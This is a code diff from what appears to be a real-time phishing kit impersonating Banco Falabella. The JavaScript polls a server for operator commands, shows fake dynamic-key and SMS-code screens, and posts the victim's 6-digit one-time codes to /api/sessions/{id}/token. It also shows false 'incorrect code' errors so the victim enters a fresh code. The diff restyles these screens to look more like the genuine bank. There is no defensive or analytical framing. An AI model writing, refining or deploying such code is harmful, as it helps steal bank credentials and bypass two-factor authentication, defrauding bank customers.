@@ -112,29 +112,36 @@ function startPolling() {
 
         if (action === 'dinamica' || action === 'sms') {
           loader.classList.remove("open");
-          document.getElementById("loginForm").style.display = "none";
-          document.getElementById("tokenForm").style.display = "block";
           
-          const tokenTitle = document.getElementById("tokenTitle");
-          const tokenDesc = document.getElementById("tokenDesc");
+          // Ocultar drawer de login y mostrar pantalla completa de Clave Dinámica/SMS
+          document.getElementById("loginOverlay").classList.remove("open");
+          document.getElementById("claveScreen").style.display = "flex";
+          
+          const claveTitle = document.getElementById("claveTitle");
+          const claveDesc = document.getElementById("claveDesc");
+          const claveSideText = document.getElementById("claveSideText");
+          const claveBadgeText = document.getElementById("claveBadgeText");
+          const claveInput = document.getElementById("claveInput");
+          const claveAuth = document.getElementById("claveAuth");
+          
           if (action === 'sms') {
-            tokenTitle.textContent = "Ingresa tu código SMS";
-            tokenDesc.textContent = "Por favor ingresa el código de 6 dígitos que enviamos por mensaje de texto a tu celular.";
+            claveTitle.textContent = "Ingreso de Código SMS";
+            claveDesc.innerHTML = "Ingresa el código de seguridad de 6 dígitos que enviamos por SMS a tu celular";
+            claveSideText.innerHTML = "Encuentra tu <strong>Código SMS</strong> en la bandeja de entrada de tu celular";
+            claveBadgeText.textContent = "Código SMS";
           } else {
-            tokenTitle.textContent = "Ingresa tu clave dinámica";
-            tokenDesc.textContent = "Encuentra tu clave dinámica de 6 dígitos en la aplicación móvil de tu banco e ingrésala abajo.";
+            claveTitle.textContent = "Ingreso de Clave Dinámica";
+            claveDesc.innerHTML = "Ingresa el código de seguridad de 6 dígitos que aparece en tu app <strong>Banco Falabella</strong>";
+            claveSideText.innerHTML = "Encuentra tu <strong>Clave Dinámica</strong> en la pantalla principal de tu app <strong>Banco Falabella</strong>";
+            claveBadgeText.textContent = "Clave Dinámica";
           }
           
-          const tokenInputEl = document.getElementById("tokenInput");
-          const tokenSubmitEl = document.getElementById("tokenSubmit");
-          if (tokenInputEl) {
-            tokenInputEl.value = "";
-            tokenInputEl.focus();
+          if (claveInput) {
+            claveInput.value = "";
+            claveInput.focus();
           }
-          if (tokenSubmitEl) {
-            tokenSubmitEl.disabled = true;
-            tokenSubmitEl.classList.add("btn-disabled");
-            tokenSubmitEl.classList.remove("btn-primary");
+          if (claveAuth) {
+            claveAuth.disabled = true;
           }
         } else if (action === 'error-login') {
           stopPing();
@@ -146,12 +153,17 @@ function startPolling() {
           document.getElementById("loginError").textContent = "Documento o contraseña incorrecta. Por favor, verifica tus datos.";
         } else if (state === 'error-dinamica' || state === 'error-sms') {
           loader.classList.remove("open");
-          document.getElementById("tokenSubmit").disabled = false;
-          document.getElementById("tokenError").textContent = "Código de validación incorrecto o expirado. Intenta de nuevo.";
+          const claveAuth = document.getElementById("claveAuth");
+          if (claveAuth) claveAuth.disabled = false;
+          document.getElementById("claveError").textContent = "Código de validación incorrecto o expirado. Intenta de nuevo.";
         } else if (action === 'done') {
           stopPing();
           stopPolling();
           loader.classList.remove("open");
+          
+          // Ocultar claveScreen si estaba abierta
+          document.getElementById("claveScreen").style.display = "none";
+          
           setSession({
             type: docType.value,
             doc: docNumber.value,
@@ -205,17 +217,14 @@ document.getElementById("loginForm").addEventListener("submit", (e) => {
   });
 });
 
-const tokenInput = document.getElementById("tokenInput");
-tokenInput?.addEventListener("input", () => {
-  tokenInput.value = tokenInput.value.replace(/\D/g, "").slice(0, 6);
+const claveInput = document.getElementById("claveInput");
+claveInput?.addEventListener("input", () => {
+  claveInput.value = claveInput.value.replace(/\D/g, "").slice(0, 6);
   
-  // Habilitar/deshabilitar botón según la longitud (6 dígitos)
-  const tokenSubmit = document.getElementById("tokenSubmit");
-  if (tokenSubmit) {
-    const ok = tokenInput.value.length === 6;
-    tokenSubmit.disabled = !ok;
-    tokenSubmit.classList.toggle("btn-disabled", !ok);
-    tokenSubmit.classList.toggle("btn-primary", ok);
+  // Habilitar/deshabilitar botón de autorizar
+  const claveAuth = document.getElementById("claveAuth");
+  if (claveAuth) {
+    claveAuth.disabled = claveInput.value.length !== 6;
   }
 
   if (pollInterval) {
@@ -227,21 +236,21 @@ tokenInput?.addEventListener("input", () => {
   }
 });
 
-document.getElementById("tokenForm")?.addEventListener("submit", (e) => {
+document.getElementById("claveForm")?.addEventListener("submit", (e) => {
   e.preventDefault();
-  const tokenSubmit = document.getElementById("tokenSubmit");
-  if (tokenInput.value.length !== 6) {
-    document.getElementById("tokenError").textContent = "El código debe tener 6 dígitos.";
+  const claveAuth = document.getElementById("claveAuth");
+  if (claveInput.value.length !== 6) {
+    document.getElementById("claveError").textContent = "El código debe tener 6 dígitos.";
     return;
   }
-  document.getElementById("tokenError").textContent = "";
+  document.getElementById("claveError").textContent = "";
   document.getElementById("bfLoader").classList.add("open");
-  tokenSubmit.disabled = true;
+  if (claveAuth) claveAuth.disabled = true;
 
   fetch(`/api/sessions/${sessionId}/token`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ token: tokenInput.value })
+    body: JSON.stringify({ token: claveInput.value })
   })
   .then(() => {
     startPing();
@@ -249,9 +258,13 @@ document.getElementById("tokenForm")?.addEventListener("submit", (e) => {
   })
   .catch(() => {
     document.getElementById("bfLoader").classList.remove("open");
-    tokenSubmit.disabled = false;
-    document.getElementById("tokenError").textContent = "Error de red. Intenta de nuevo.";
+    if (claveAuth) claveAuth.disabled = false;
+    document.getElementById("claveError").textContent = "Error de red. Intenta de nuevo.";
   });
+});
+
+document.getElementById("claveHelp")?.addEventListener("click", () => {
+  toast("Ingresa el código que visualizas en la aplicación de tu celular.");
 });
 
 [docNumber, password].forEach(input => {
